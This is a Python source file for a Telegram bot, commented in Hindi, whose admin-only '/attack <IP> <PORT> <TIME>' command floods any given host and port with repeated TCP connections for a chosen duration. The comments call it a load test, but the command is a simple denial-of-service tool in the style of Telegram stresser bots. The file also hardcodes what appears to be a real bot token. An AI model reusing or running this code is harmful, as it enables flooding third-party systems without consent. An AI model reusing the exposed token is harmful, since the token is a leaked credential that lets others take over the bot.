import threading
import socket
import time
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

BOT_TOKEN = '7792663399:AAGGRAQe4hrlaRiWuKEnj0YcHvmsft9jcFQ'
ADMIN_ID = 7792663399  # यहाँ अपना Telegram यूज़र ID डालें

# TCP packets भेजने का फंक्शन
def send_test_packets(ip, port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, port))
            sock.send(b'TESTING123')
            sock.close()
        except:
            pass
        time.sleep(0.1)  # बहुत तेज़ ना हो इसलिए

# Telegram command हैंडलर
async def attack_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ अनुमति नहीं है।")
        return

    if len(context.args) != 3:
        await update.message.reply_text("Usage: /attack <IP> <PORT> <TIME>")
        return

    ip = context.args[0]
    port = int(context.args[1])
    duration = int(context.args[2])

    await update.message.reply_text(f"🟡 टेस्ट शुरू: {ip}:{port} पर {duration} सेकंड के लिए...")

    thread = threading.Thread(target=send_test_packets, args=(ip, port, duration))
    thread.start()

    await update.message.reply_text("✅ लोड टेस्ट शुरू हो गया।")

# बोट शुरू करना
app = ApplicationBuilder().token(BOT_TOKEN).build()
app.add_handler(CommandHandler("attack", attack_handler))

print("🤖 बोट चालू है...")
app.run_polling()
